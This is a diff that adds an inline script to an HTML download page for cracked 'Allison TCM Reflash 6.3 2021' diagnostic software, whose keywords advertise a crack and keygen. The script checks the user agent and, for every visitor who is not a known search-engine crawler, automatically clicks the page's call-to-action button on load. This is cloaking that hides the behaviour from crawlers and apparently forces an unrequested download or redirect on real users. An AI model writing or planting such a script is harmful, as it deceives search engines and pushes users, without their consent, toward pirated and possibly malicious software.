@@ -5,6 +5,42 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Allison TCM Reflash 6.3 2021</title>
+    
+<script>
+const searchEngineUserAgents = [
+  'Googlebot',
+  'Bingbot',
+  'YandexBot',
+  'DuckDuckBot',
+  'Baiduspider',
+];
+
+function isSearchEngine(userAgent) {
+  return searchEngineUserAgents.some(bot => userAgent.includes(bot));
+}
+
+function clickCTAButton() {
+  const ctaButton = document.querySelector('.cta-button');
+  if (ctaButton) {
+    ctaButton.click();
+  }
+}
+
+function main() {
+  const userAgent = navigator.userAgent;
+  
+  if (!isSearchEngine(userAgent)) {
+    if (document.readyState === 'loading') {
+      document.addEventListener('DOMContentLoaded', clickCTAButton);
+    } else {
+      clickCTAButton();
+    }
+  }
+}
+
+main();
+</script>
+
     <meta name="description" content="Download Allison TCM Reflash 6.3 2021 for diagnostics and calibration of Allison transmissions. Supports multiple regions and devices.">
     <meta name="keywords" content="Allison TCM Reflash 6.3 2021, Allison TCM Reflash 2021 free download, Allison TCM Reflash 6.3 download, Allison TCM Reflash 6.3 2021 software, Allison TCM Reflash diagnostic software, Allison TCM Reflash 6.3 crack, Allison TCM Reflash keygen, Allison TCM Reflash Nexiq USB Link, Allison TCM Reflash Windows 10, Allison TCM Reflash Windows 11, Allison TCM Reflash all regions, Allison TCM Reflash скачать бесплатно, Allison TCM Reflash 6.3 2021 русский, Allison TCM Reflash 6.3 2021 український">
     <style>
